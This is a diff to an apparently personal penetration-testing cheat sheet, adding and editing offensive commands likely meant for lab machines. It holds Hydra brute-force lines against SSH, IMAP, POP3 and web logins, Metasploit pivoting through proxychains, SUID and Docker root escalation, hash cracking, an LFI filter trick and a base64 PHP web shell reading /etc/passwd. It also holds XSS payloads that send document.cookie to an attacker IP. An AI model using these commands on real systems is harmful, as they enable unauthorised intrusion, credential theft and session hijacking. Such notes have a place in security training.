@@ -54,6 +54,13 @@ nc -nvlp 1337
 pip3 install pwncat-cs
 python3 -m pwncat :1337
 
+# TOR setup (tor, vpn)
+You can actually use tor from "tor browser" with proxychains-ng:
+Config `proxychains.conf` by changing the last line from `socks4` 
+to `socks5  127.0.0.1 9150`.
+
+Check working TOR with `proxychains4 curl https://www.get-my-ip.info/api/ip`
+
 # IMAP (imap, pop3, TSL)
 openssl s_client -connect 10.129.14.128:imaps
 
@@ -165,10 +172,16 @@ echo "/bin/bash" > tar
 echo $PATH
 export PATH=/tmp:$PATH
 
+# find suid binaries
 find / -perm -4000 2>/dev/null
+bash -p
+
 
 From user to root (Privilege Escalation)
-find / -perm +6000 2> /dev/null
+find / -perm +6000 2>/dev/null
+
+# Find files (find user files)
+find / -user username 2>/dev/null 
 
 # Docker (priv, escalation, root)
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
@@ -208,9 +221,9 @@ echo -n "string" | minimodem -t -f 1200.wav 1200
 Wav to ascii:
 minimodem -r -f 1200.wav 1200
 
-# NMAP
+# NMAP (nmap, port)
 sudo nmap -sVC -sS host
-nmap -sVC --top-ports 1000 host
+nmap -A --top-ports 1000 host
 
 Ping Scan:
 sudo nmap 10.10.1.1 -sn -PE --packet-trace -oA hosts --reason
@@ -344,6 +357,9 @@ gobuster vhost -u http://host/ -w /usr/share/wordlists/dirb/big.txt | grep 200
 --hh = hide response answer with charsize
 wfuzz --hh 455 -w /usr/share/seclists/Discovery/Web-Content/big.txt 'http://host/?view=FUZZ'
 
+# FFUF (ffuf, fuzz, web)
+ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.8.208/FUZZ
+
 # DOTDOTPWN (dotdotpwn, php, fuzzing)
 dotdotpwn -m http-url -u 'http://subdomain.domain.htb/index.php?page=TRAVERSAL' -k root
 
@@ -422,6 +438,12 @@ set DOMAIN support.htb
 set NS DNS_IP
 run
 
+# HYDRA (hydra, forms, post, data)
+hydra -L usernames.txt -P passwords.txt ssh://10.10.83.180:22 -I
+hydra -L usernames.txt -P passwords.txt imap://10.10.83.180:143 -I
+hydra -L usernames.txt -P passwords.txt pop3://10.10.83.180:110 -I
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.60.202 http-post-form '/login:username=^USER^&password=^PASS^:F=/login' -I
+
 # METASPLOIT (metasploit, msfconsole)
 Basic msfconsole:
 search php
@@ -439,6 +461,13 @@ hosts -d (delete hosts)
 db_nmap -A --top-ports 1000 10.129.203.65
 setg RHOSTS  10.129.203.65 (set global)
 use post/multi/recon/local_exploit_suggester
+
+upgrade shell to meterpreter:
+sessions -u -1
+resolve webservice_database
+route add 172.28.101.51/32 -1
+run srvhost=127.0.0.1 srvport=9050 version=4a
+proxychains nmap 172.28.101.51
 
 hashdump
 load kiwi
@@ -529,6 +558,7 @@ token:elevate
 lsadump::sam
 
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT thomas.hash
+john hashes.txt -wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
 john --incremental:Lower --incremental:Alpha --incremental:Digits (10 char) --incremental:Alnum
 john --mask=?1?1?1?1?1?1?1?1 -1=[A-Z]
 wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/doc/MASK
@@ -593,9 +623,9 @@ html
 new Image().src='http://OUR_IP/index.php?c='+document.cookie
 "'><img src=1337xx onerror=this.src='http://10.8.10.59:8080/?'+document.cookie;>
 
-# PHP Local File Inclusion (php, lfi)
+# PHP Local File Inclusion (php, filter, lfi)
 index.php?param=php://filter/convert.base64-encode/resource=index
-url http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=index.php | base64 -d
+curl http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=index.php | base64 -d
 
 # PHP RCE (php, rce, base64)
 http://68.183.35.90:30015/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/etc/passwd
